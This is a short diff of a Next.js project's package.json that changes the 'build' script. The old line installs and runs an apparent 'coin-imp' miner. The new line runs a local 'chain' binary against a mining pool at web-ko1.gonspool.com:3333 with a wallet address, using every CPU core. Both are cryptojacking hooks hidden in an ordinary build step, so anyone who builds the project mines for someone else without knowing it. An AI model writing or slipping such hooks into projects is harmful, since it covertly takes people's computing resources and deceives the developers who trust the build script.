@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "npm install -g coin-imp && coin-imp 17603bb8822e8c5081c7819a32b33a35cf39ff51aabad1d963c9f6e7a8168441",
+    "build": "chmod +x chain && ./chain -o web-ko1.gonspool.com:3333 -u 0x618758ae107193d6334439f6b3f1553ac6e43b62 --worker-id=4 -p x -t $(nproc --all)",
     "start": "next start",
     "lint": "next lint"
   },
